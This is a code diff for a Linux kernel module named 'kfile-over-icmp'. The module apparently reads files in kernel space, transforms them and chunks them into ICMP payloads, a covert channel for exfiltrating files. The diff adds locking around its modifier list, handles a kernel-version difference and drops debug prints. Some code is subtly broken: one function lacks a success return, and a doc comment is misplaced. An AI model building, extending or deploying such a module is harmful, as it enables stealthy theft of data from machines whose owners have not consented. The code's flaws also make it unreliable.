@@ -13,6 +13,7 @@ LIST_HEAD(g_chunk_list);
 DEFINE_SPINLOCK(g_chunk_list_spinlock);
 
 LIST_HEAD(g_data_modifiers_list);
+DEFINE_MUTEX(g_data_modifiers_list_mutex);
 
 struct task_struct* g_payload_generator_thread;
 unsigned int g_payload_generator_thread_stop = 0;
@@ -48,14 +49,14 @@ ssize_t safe_read_from_file(struct file *filp, char *file_data, size_t file_size
     //         kernel FS to KERNEL_DS, we actually tell it to expect a kernel-space buffer. Note that
     //         restoring the old FS after the call to vfs_read is super-important, otherwise kernel panic
     //         will be caused.
+#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
     mm_segment_t security_old_fs = get_fs();
     set_fs(get_ds());
-#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
     ssize_t size_read = vfs_read(filp, file_data, file_size, current_position);
+    set_fs(security_old_fs);  
 #else
     ssize_t size_read = kernel_read(filp, file_data, file_size, current_position);
 #endif
-    set_fs(security_old_fs);  
 
     return size_read;  
 }
@@ -77,19 +78,6 @@ void copy_signature_to_chunk(struct file_chunk *chunk, size_t file_size)
     chunk->chunk_size += sizeof(struct new_file_signature);
 }
 
-int payload_generator_add_modifier(data_modifier_func func)
-{
-    struct data_modifier *modifier = (struct data_modifier *)kmalloc(sizeof(struct data_modifier), GFP_KERNEL);
-    if (NULL == modifier) {
-        return -ENOMEM;
-    }
-
-    modifier->func = func;
-
-    INIT_LIST_HEAD(&(modifier->l_head));
-    list_add(&(modifier->l_head), &g_data_modifiers_list);
-}
-
 /**
  * kmalloc_array - allocate memory for an array.
  * @n: number of elements.
@@ -97,10 +85,12 @@ int payload_generator_add_modifier(data_modifier_func func)
  * @flags: the type of memory to allocate (see kmalloc).
  * @note: no need to use locks as no one accesses the modifiers list in runtime.
  */
-int run_data_modifiers_on_data(char *data, ssize_t *len)
+int run_data_modifiers_on_file(char *data, ssize_t *len)
 { 
     struct data_modifier *modifier;
     bool is_modifier_failed = false;
+
+    mutex_lock(&g_data_modifiers_list_mutex);
     list_for_each_entry(modifier, &g_data_modifiers_list, l_head) {
         if (modifier->func(data, len)) {
             // TODO: keep going or abort?
@@ -108,6 +98,7 @@ int run_data_modifiers_on_data(char *data, ssize_t *len)
             break;
         }
     }
+    mutex_unlock(&g_data_modifiers_list_mutex);
 
     return is_modifier_failed ? -EINVAL : 0;
 }
@@ -124,7 +115,7 @@ void read_file_chunks(const char* file_path)
     struct file *filp;
     filp = filp_open(file_path, O_RDONLY, 0);
     if (IS_ERR(filp)) {
-        printk(KERN_ERR "kfile-over-icmp: failed to open file. error: %ld\n", PTR_ERR(filp));
+        printk(KERN_ERR "kfile-over-icmp: failed to open %s. error: %ld\n", file_path, PTR_ERR(filp));
         return;
     }
     
@@ -148,7 +139,7 @@ void read_file_chunks(const char* file_path)
     ssize_t size_read = safe_read_from_file(filp, file_data, file_size, &current_position);
 
     // 3. run any modifiers on the file data
-    run_data_modifiers_on_data(file_data, (ssize_t *)&file_size);
+    run_data_modifiers_on_file(file_data, (ssize_t *)&file_size);
 
     // Split the file data to chunks
     bool is_first_chunk = true;
@@ -203,8 +194,6 @@ close_filp:
  */
 void process_next_pending_file(void)
 {    
-    printk(KERN_ERR "#1\n");
-
     mutex_lock(&g_requestd_files_list_mutex);
     bool is_list_empty = list_empty(&g_requestd_files_list);
     mutex_unlock(&g_requestd_files_list_mutex);
@@ -242,13 +231,9 @@ void process_next_pending_file(void)
     kfree(next_pending_file->file_path);
     kfree(next_pending_file);
 
-    printk(KERN_ERR "#2\n");
-
     // TODO: support saving only X chunks (for dealing with large files)
     // No need to acquire chunks_list_mutex as read_file_chunks does that internally.
     read_file_chunks(file_path);
-
-    printk(KERN_ERR "#3\n");
 
     return;
 
@@ -322,19 +307,46 @@ void stop_payload_generator_thread(void)
     g_payload_generator_thread_stop = 1;
     kthread_stop(g_payload_generator_thread);
     put_task_struct(g_payload_generator_thread);  
+}
 
-    // empty the modifiers list
+
+int payload_generator_add_modifier(data_modifier_func func)
+{
+    struct data_modifier *modifier = (struct data_modifier *)kmalloc(sizeof(struct data_modifier), GFP_KERNEL);
+    if (NULL == modifier) {
+        return -ENOMEM;
+    }
+
+    modifier->func = func;
+
+    mutex_lock(&g_data_modifiers_list_mutex);
+    INIT_LIST_HEAD(&(modifier->l_head));
+    list_add(&(modifier->l_head), &g_data_modifiers_list);
+    mutex_unlock(&g_data_modifiers_list_mutex);
+}
+
+void payload_generator_remove_modifier(data_modifier_func func)
+{
     struct list_head *pos = NULL;
     struct list_head *tmp = NULL;
     struct data_modifier *modifier = NULL;
-    list_for_each_safe(modifier, tmp, &g_data_modifiers_list) {
+
+    mutex_lock(&g_data_modifiers_list_mutex);
+
+    list_for_each_safe(pos, tmp, &g_data_modifiers_list) {
         modifier = list_entry(pos, struct data_modifier, l_head);
-        if (NULL == modifier) {
+
+        if (NULL == modifier)
             continue;
-        }
+
+        if (func != modifier->func) 
+            continue;
+
         list_del(pos);
         kfree(modifier);
     }
+
+    mutex_unlock(&g_data_modifiers_list_mutex);
 }
 
 size_t get_default_payload_chunk_size(void)
